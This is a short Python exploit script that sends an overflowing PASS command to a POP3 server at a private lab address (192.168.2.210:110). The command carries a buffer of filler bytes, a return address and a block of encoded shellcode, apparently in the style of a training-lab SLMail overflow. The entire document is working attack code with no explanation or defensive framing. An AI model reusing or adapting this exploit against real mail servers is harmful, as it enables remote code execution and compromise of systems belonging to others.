#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xfd\x18\xe1\x09\xe0\x05\x14\x93\xbb\x42\xd6\x3d\x1c\xb5\xb7"
"\x48\xdd\xc5\xba\x70\x4a\x61\xe7\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x26\x59\x83\x12\x3a\xb5"
"\xc1\xdd\xc2\x46\xa6\x54\x27\x77\xe6\x03\x2c\x28\xd6\x40\x60"
"\xc5\x9d\x05\x90\x5e\xd3\x81\x97\xd7\x5e\xf4\x96\xe8\xf3\xc4"
"\xb9\x6a\x0e\x19\x19\x52\xc1\x6c\x58\x93\x3c\x9c\x08\x4c\x4a"
"\x33\xbc\xf9\x06\x88\x37\xb1\x87\x88\xa4\x02\xa9\xb9\x7b\x18"
"\xf0\x19\x7a\xcd\x88\x13\x64\x12\xb4\xea\x1f\xe0\x42\xed\xc9"
"\x38\xaa\x42\x34\xf5\x59\x9a\x71\x32\x82\xe9\x8b\x40\x3f\xea"
"\x48\x3a\x9b\x7f\x4a\x9c\x68\x27\xb6\x1c\xbc\xbe\x3d\x12\x09"
"\xb4\x19\x37\x8c\x19\x12\x43\x05\x9c\xf4\xc5\x5d\xbb\xd0\x8e"
"\x06\xa2\x41\x6b\xe8\xdb\x91\xd4\x55\x7e\xda\xf9\x82\xf3\x81"
"\x95\x67\x3e\x39\x66\xe0\x49\x4a\x54\xaf\xe1\xc4\xd4\x38\x2c"
"\x13\x1a\x13\x88\x8b\xe5\x9c\xe9\x82\x21\xc8\xb9\xbc\x80\x71"
"\x52\x3c\x2c\xa4\xf5\x6c\x82\x17\xb6\xdc\x62\xc8\x5e\x36\x6d"
"\x37\x7e\x39\xa7\x50\x15\xc0\x20\x9f\x42\xc8\x78\x77\x91\xcc"
"\x79\x33\x1c\x2a\x13\x53\x49\xe5\x8c\xca\xd0\x7d\x2c\x12\xcf"
"\xf8\x6e\x98\xfc\xfd\x21\x69\x88\xed\xd6\x99\xc7\x4f\x70\xa5"
"\xfd\xe7\x1e\x34\x9a\xf7\x69\x25\x35\xa0\x3e\x9b\x4c\x24\xd3"
"\x82\xe6\x5a\x2e\x52\xc0\xde\xf5\xa7\xcf\xdf\x78\x93\xeb\xcf"
"\x44\x1c\xb0\xbb\x18\x4b\x6e\x15\xdf\x25\xc0\xcf\x89\x9a\x8a"
"\x87\x4c\xd1\x0c\xd1\x50\x3c\xfb\x3d\xe0\xe9\xba\x42\xcd\x7d"
"\x4b\x3b\x33\x1e\xb4\x96\xf7\x3e\x57\x32\x02\xd7\xce\xd7\xaf"
"\xba\xf0\x02\xf3\xc2\x72\xa6\x8c\x30\x6a\xc3\x89\x7d\x2c\x38"
"\xe0\xee\xd9\x3e\x57\x0e\xc8")

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + shellcode +"C"*(3500-2606-4-351)


try:
    print "\nSending evil buffer..."
    s.connect(('192.168.2.210',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer +'\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

